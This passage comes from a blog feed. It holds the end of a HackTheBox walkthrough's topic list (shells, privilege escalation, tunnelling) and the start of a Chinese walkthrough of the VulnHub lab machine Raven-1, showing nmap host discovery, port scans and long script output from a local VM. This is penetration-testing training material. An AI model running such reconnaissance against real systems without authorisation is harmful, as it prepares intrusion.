<h4 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h4><ul>
<li>Code Execution and getShell in Node-Red</li>
<li>Network Enumeration and ping sweep</li>
<li>upgrade path to Meterpreter using sessions -u</li>
<li>compolicated port forwarding tech</li>
<li>error information disclosure</li>
<li>redis service getshell</li>
<li>socat port forwarding</li>
<li>Exploiting the Wildcard and cronjob to privesc</li>
<li>perl and port forwarding to download file</li>
<li>use port 873 rsync service and cron job to getshell and privesc</li>
<li>beyong root research</li>
<li>Dropbear Create Tunnel and get root shell</li>
<li>python auto-pwn script</li>
</ul>
<h4 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h4><ul>
<li>QQ: 1185151867</li>
<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
]]></content>
      <categories>
        <category>HackTheBox walkthrough</category>
      </categories>
      <tags>
        <tag>HackTheBox靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[Raven-1]</title>
    <url>/2020/02/12/Raven-1/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：Raven：1<br>发布日期：2018年8月14日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL29wZW4/aWQ9MXBDRnYtT1hta25MVmx1VXVfOFpDRHIxWFlXUERmTHhX">https://drive.google.com/open?id=1pCFv-OXmknLVluUu_8ZCDr1XYWPDfLxW<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9yYXZlbi9SYXZlbi5vdmE=">https://download.vulnhub.com/raven/Raven.ova<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9yYXZlbi9SYXZlbi5vdmEudG9ycmVudA==">https://download.vulnhub.com/raven/Raven.ova.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>Raven是初学者/中级boot2root计算机。有四个flag可以找到，并且有两个预期的root方法。使用VMware构建并在Virtual Box上进行了测试。设置为使用NAT网络。</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.118</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line">MAC Address: 08:00:27:D2:E6:4F (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nmap -p- -sV -v -Pn 192.168.56.118</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">36286/tcp open  status  1 (RPC <span class="comment">#100024)</span></span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nmap -p- -sU -Pn -v 192.168.56.118 --min-rate=10000</span></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">111/udp open  rpcbind</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nmap -p 22,80,111,36286 -sV -v -Pn -A --script all 192.168.56.118 --min-rate=100000</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</span><br><span class="line">|_banner: SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u4</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| ssh-auth-methods: </span><br><span class="line">|   Supported authentication methods: </span><br><span class="line">|     publickey</span><br><span class="line">|_    password</span><br><span class="line">| ssh-brute: </span><br><span class="line">|   Accounts: No valid accounts found</span><br><span class="line">|_  Statistics: Performed 0 guesses <span class="keyword">in</span> 1807 seconds, average tps: 0.0</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:<span class="built_in">fc</span> (DSA)</span><br><span class="line">|   2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)</span><br><span class="line">|   256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)</span><br><span class="line">|_  256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)</span><br><span class="line">| ssh-publickey-acceptance: </span><br><span class="line">|_  Accepted Public Keys: No public keys accepted</span><br><span class="line">|_ssh-run: Failed to specify credentials and <span class="built_in">command</span> to run.</span><br><span class="line">| ssh2-enum-algos: </span><br><span class="line">|   kex_algorithms: (6)</span><br><span class="line">|       curve25519-sha256@libssh.org</span><br><span class="line">|       ecdh-sha2-nistp256</span><br><span class="line">|       ecdh-sha2-nistp384</span><br><span class="line">|       ecdh-sha2-nistp521</span><br><span class="line">|       diffie-hellman-group-exchange-sha256</span><br><span class="line">|       diffie-hellman-group14-sha1</span><br><span class="line">|   server_host_key_algorithms: (4)</span><br><span class="line">|       ssh-rsa</span><br><span class="line">|       ssh-dss</span><br><span class="line">|       ecdsa-sha2-nistp256</span><br><span class="line">|       ssh-ed25519</span><br><span class="line">|   encryption_algorithms: (6)</span><br><span class="line">|       aes128-ctr</span><br><span class="line">|       aes192-ctr</span><br><span class="line">|       aes256-ctr</span><br><span class="line">|       aes128-gcm@openssh.com</span><br><span class="line">|       aes256-gcm@openssh.com</span><br><span class="line">|       chacha20-poly1305@openssh.com</span><br><span class="line">|   mac_algorithms: (10)</span><br><span class="line">|       umac-64-etm@openssh.com</span><br><span class="line">|       umac-128-etm@openssh.com</span><br><span class="line">|       hmac-sha2-256-etm@openssh.com</span><br><span class="line">|       hmac-sha2-512-etm@openssh.com</span><br><span class="line">|       hmac-sha1-etm@openssh.com</span><br><span class="line">|       umac-64@openssh.com</span><br><span class="line">|       umac-128@openssh.com</span><br><span class="line">|       hmac-sha2-256</span><br><span class="line">|       hmac-sha2-512</span><br><span class="line">|       hmac-sha1</span><br><span class="line">|   compression_algorithms: (2)</span><br><span class="line">|       none</span><br><span class="line">|_      zlib@openssh.com</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_citrix-brute-xml: FAILED: No domain specified (use ntdomain argument)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-brute:   </span><br><span class="line">|_  Path <span class="string">&quot;/&quot;</span> does not require authentication</span><br><span class="line">|_http-chrono: Request <span class="built_in">times</span> <span class="keyword">for</span> /; avg: 284.71ms; min: 236.36ms; max: 327.61ms</span><br><span class="line">| http-comments-displayer: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.118</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/about.html</span><br><span class="line">|     Line number: 16</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- Site Title --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/owl.carousel.css</span><br><span class="line">|     Line number: 112</span><br><span class="line">|     Comment: </span><br><span class="line">|         </span><br><span class="line">|         </span><br><span class="line">|          */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 3425</span><br><span class="line">|     Comment: </span><br><span class="line">|         /*</span><br><span class="line">|         <span class="comment">################</span></span><br><span class="line">|                        End Blog Details  Page style</span><br><span class="line">|         <span class="comment">################</span></span><br><span class="line">|         */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 1989</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* Nav Menu Essentials */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 2028</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* Nav Menu Arrows */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 10</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* Code <span class="keyword">for</span> Firefox */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/about.html</span><br><span class="line">|     Line number: 196</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- Start team Area --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/owl.carousel.css</span><br><span class="line">|     Line number: 81</span><br><span class="line">|     Comment: </span><br><span class="line">|         </span><br><span class="line">|         </span><br><span class="line">|          */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/about.html</span><br><span class="line">|     Line number: 12</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- Meta Keyword --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 150</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- <span class="comment">#colophon --&gt;</span></span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/jquery.counterup.min.js</span><br><span class="line">|     Line number: 1</span><br><span class="line">|     Comment: </span><br><span class="line">|         /*!</span><br><span class="line">|         * jquery.counterup.js 1.0</span><br><span class="line">|         *</span><br><span class="line">|         * Copyright 2013, Benjamin Intal http://gambit.ph @bfintal</span><br><span class="line">|         * Released under the GPL v2 License</span><br><span class="line">|         *</span><br><span class="line">|         * Date: Nov 26, 2013</span><br><span class="line">|         */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 106</span><br><span class="line">|     Comment: </span><br><span class="line">|         /**</span><br><span class="line">|          *  Typography</span><br><span class="line">|          *</span><br><span class="line">|          **/</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/waypoints.min.js</span><br><span class="line">|     Line number: 2</span><br><span class="line">|     Comment: </span><br><span class="line">|         /*</span><br><span class="line">|         jQuery Waypoints - v2.0.3</span><br><span class="line">|         Copyright (c) 2011-2013 Caleb Troughton</span><br><span class="line">|         Dual licensed under the MIT license and GPL license.</span><br><span class="line">|         https://github.com/imakewebthings/jquery-waypoints/blob/master/licenses.txt</span><br><span class="line">|         */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/mail-script.js</span><br><span class="line">|     Line number: 15</span><br><span class="line">|     Comment: </span><br><span class="line">|          // request <span class="built_in">type</span> html/json/xml</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/about.html</span><br><span class="line">|     Line number: 4</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- Mobile Specific Meta --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 1</span><br><span class="line">|     Comment: </span><br><span class="line">|         /*--------------------------- Color variations ----------------------*/</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 7</span><br><span class="line">|     Comment: </span><br><span class="line">|         /*  Basic Style </span><br><span class="line">|         /* =================================== */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 47</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* Microsoft Edge */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 2208</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* Mobile Nav body classes */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 107</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- <span class="comment">#main --&gt;</span></span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 2057</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* Nav Meu Styling */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 75</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- .site-branding --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/contact.php</span><br><span class="line">|     Line number: 148</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- End contact-page Area --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/index.html</span><br><span class="line">|     Line number: 291</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- End galery Area --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 156</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* ]]&gt; */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/owl.carousel.css</span><br><span class="line">|     Line number: 129</span><br><span class="line">|     Comment: </span><br><span class="line">|         </span><br><span class="line">|         </span><br><span class="line">|          */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 154</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* &lt;![CDATA[ */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/jquery.sticky.js</span><br><span class="line">|     Line number: 8</span><br><span class="line">|     Comment: </span><br><span class="line">|         </span><br><span class="line">|         // Website: http://labs.anthonygarand.com/sticky</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 152</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- <span class="comment">#page --&gt;</span></span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 34</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* Mozilla Firefox 19+ */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/superfish.min.js</span><br><span class="line">|     Line number: 1</span><br><span class="line">|     Comment: </span><br><span class="line">|         /*</span><br><span class="line">|          * jQuery Superfish Menu Plugin - v1.7.9</span><br><span class="line">|          * Copyright (c) 2016 Joel Birch</span><br><span class="line">|          *</span><br><span class="line">|          * Dual licensed under the MIT and GPL licenses:</span><br><span class="line">|          *    http://www.opensource.org/licenses/mit-license.php</span><br><span class="line">|          *    http://www.gnu.org/licenses/gpl.html</span><br><span class="line">|          */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 4</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* Mobile Layout: 320px */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/jquery.sticky.js</span><br><span class="line">|     Line number: 6</span><br><span class="line">|     Comment: </span><br><span class="line">|         </span><br><span class="line">|         // Created: 2/14/2011</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 27</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* Mozilla Firefox 4 to 18 */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 141</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- <span class="comment">#content --&gt;</span></span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 80</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- <span class="comment">#masthead --&gt;</span></span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 137</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- <span class="comment">#secondary --&gt;</span></span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 105</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- <span class="comment">#post-## --&gt;</span></span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 108</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- <span class="comment">#primary --&gt;</span></span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 102</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- .entry-content --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 97</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- .entry-header --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/mail-script.js</span><br><span class="line">|     Line number: 16</span><br><span class="line">|     Comment: </span><br><span class="line">|          // serialize form data</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 6</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* =================================== */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/index.html</span><br><span class="line">|     Line number: 210</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- End feature Area --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 3</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* Tablet Layout: 768px */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/owl.carousel.css</span><br><span class="line">|     Line number: 77</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* No Js */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/owl.carousel.css</span><br><span class="line">|     Line number: 118</span><br><span class="line">|     Comment: </span><br><span class="line">|         </span><br><span class="line">|         </span><br><span class="line">|          */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 77</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- .custom-header --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/jquery.sticky.js</span><br><span class="line">|     Line number: 140</span><br><span class="line">|     Comment: </span><br><span class="line">|          // should be more efficient than using <span class="variable">$window</span>.scroll(scroller) and <span class="variable">$window</span>.resize(resizer):</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 21</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* WebKit, Blink, Edge */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/jquery.magnific-popup.min.js</span><br><span class="line">|     Line number: 1</span><br><span class="line">|     Comment: </span><br><span class="line">|         /*! Magnific Popup - v1.1.0 - 2016-02-20</span><br><span class="line">|         * http://dimsemenov.com/plugins/magnific-popup/</span><br><span class="line">|         * Copyright (c) 2016 Dmitry Semenov; */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 2</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* Medium Layout: 1280px */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 70</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- .site-branding-text --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/about.html</span><br><span class="line">|     Line number: 14</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- meta character <span class="built_in">set</span> --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/about.html</span><br><span class="line">|     Line number: 269</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- start footer Area --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 41</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* Internet Explorer 10-11 */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/linearicons.css</span><br><span class="line">|     Line number: 22</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* Better Font Rendering =========== */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/about.html</span><br><span class="line">|     Line number: 74</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- start banner Area --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 39</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!--[<span class="keyword">if</span> lt IE 9]&gt;</span><br><span class="line">|         &lt;script <span class="built_in">type</span>=<span class="string">&#x27;text/javascript&#x27;</span> src=<span class="string">&#x27;http://raven.local/wordpress/wp-content/themes/twentyseventeen/assets/js/html5.js?ver=3.7.3&#x27;</span>&gt;&lt;/script&gt;</span><br><span class="line">|         &lt;![endif]--&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 36</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!--[<span class="keyword">if</span> lt IE 9]&gt;</span><br><span class="line">|         &lt;link rel=<span class="string">&#x27;stylesheet&#x27;</span> id=<span class="string">&#x27;twentyseventeen-ie8-css&#x27;</span>  href=<span class="string">&#x27;http://raven.local/wordpress/wp-content/themes/twentyseventeen/assets/css/ie8.css?ver=1.0&#x27;</span> <span class="built_in">type</span>=<span class="string">&#x27;text/css&#x27;</span> media=<span class="string">&#x27;all&#x27;</span> /&gt;</span><br><span class="line">|         &lt;![endif]--&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/jquery.nice-select.min.js</span><br><span class="line">|     Line number: 1</span><br><span class="line">|     Comment: </span><br><span class="line">|         /*  jQuery Nice Select - v1.0</span><br><span class="line">|             https://github.com/hernansartorio/jquery-nice-select</span><br><span class="line">|             Made by Hern\xC3\xA1n Sartorio  */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/owl.carousel.css</span><br><span class="line">|     Line number: 6</span><br><span class="line">|     Comment: </span><br><span class="line">|         </span><br><span class="line">|         </span><br><span class="line">|          */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 97</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- .entry-meta --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/owl.carousel.css</span><br><span class="line">|     Line number: 29</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* fix <span class="keyword">for</span> flashing background */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/owl.carousel.css</span><br><span class="line">|     Line number: 13</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* position relative and z-index fix webkit rendering fonts issue */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 2101</span><br><span class="line">|     Comment: </span><br><span class="line">|         /* Mobile Nav Toggle */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/index.html</span><br><span class="line">|     Line number: 368</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- End blog Area --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/about.html</span><br><span class="line">|     Line number: 20</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!--</span><br><span class="line">|                               CSS</span><br><span class="line">|                               ============================================= --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/parallax.min.js</span><br><span class="line">|     Line number: 1</span><br><span class="line">|     Comment: </span><br><span class="line">|         /*!</span><br><span class="line">|          * parallax.js v1.5.0 (http://pixelcog.github.io/parallax.js/)</span><br><span class="line">|          * @copyright 2016 PixelCog, Inc.</span><br><span class="line">|          * @license MIT (https://github.com/pixelcog/parallax.js/blob/master/LICENSE)</span><br><span class="line">|          */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/jquery.ajaxchimp.min.js</span><br><span class="line">|     Line number: 103</span><br><span class="line">|     Comment: </span><br><span class="line">|          // Translate and display submit message</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/jquery.ajaxchimp.min.js</span><br><span class="line">|     Line number: 69</span><br><span class="line">|     Comment: </span><br><span class="line">|          // Translate and display message</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 151</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- .site-content-contain --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/mail-script.js</span><br><span class="line">|     Line number: 10</span><br><span class="line">|     Comment: </span><br><span class="line">|          // prevent default form submit</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/wordpress/</span><br><span class="line">|     Line number: 148</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- .site-info --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/mail-script.js</span><br><span class="line">|     Line number: 23</span><br><span class="line">|     Comment: </span><br><span class="line">|          // reset form</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/mail-script.js</span><br><span class="line">|     Line number: 22</span><br><span class="line">|     Comment: </span><br><span class="line">|          // fade <span class="keyword">in</span> response data</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/mail-script.js</span><br><span class="line">|     Line number: 14</span><br><span class="line">|     Comment: </span><br><span class="line">|          // form submit method get/post</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/about.html</span><br><span class="line">|     Line number: 10</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- Meta Description --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/about.html</span><br><span class="line">|     Line number: 68</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- <span class="comment">#nav-menu-container --&gt;</span></span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/mail-script.js</span><br><span class="line">|     Line number: 19</span><br><span class="line">|     Comment: </span><br><span class="line">|          // change submit button text</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 167</span><br><span class="line">|     Comment: </span><br><span class="line">|         /**</span><br><span class="line">|          * For modern browsers</span><br><span class="line">|          * 1. The space content is one way to avoid an Opera bug when the</span><br><span class="line">|          *    contenteditable attribute is included anywhere <span class="keyword">else</span> <span class="keyword">in</span> the document.</span><br><span class="line">|          *    Otherwise it causes space to appear at the top and bottom of elements</span><br><span class="line">|          *    that are clearfixed.</span><br><span class="line">|          * 2. The use of `table` rather than `block` is only necessary <span class="keyword">if</span> using</span><br><span class="line">|          *    `:before` to contain the top-margins of child elements.</span><br><span class="line">|          */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/index.html</span><br><span class="line">|     Line number: 150</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- Start feature Area --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/mail-script.js</span><br><span class="line">|     Line number: 13</span><br><span class="line">|     Comment: </span><br><span class="line">|          // form action url</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/about.html</span><br><span class="line">|     Line number: 280</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- Link back to Colorlib can<span class="string">&#x27;t be removed. Template is licensed under CC BY 3.0. --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/js/jquery.sticky.js</span></span><br><span class="line"><span class="string">|     Line number: 4</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         </span></span><br><span class="line"><span class="string">|         // Improvements by German M. Bravo (Kronuz) and Ruud Kamphuis (ruudk)</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/js/mail-script.js</span></span><br><span class="line"><span class="string">|     Line number: 8</span></span><br><span 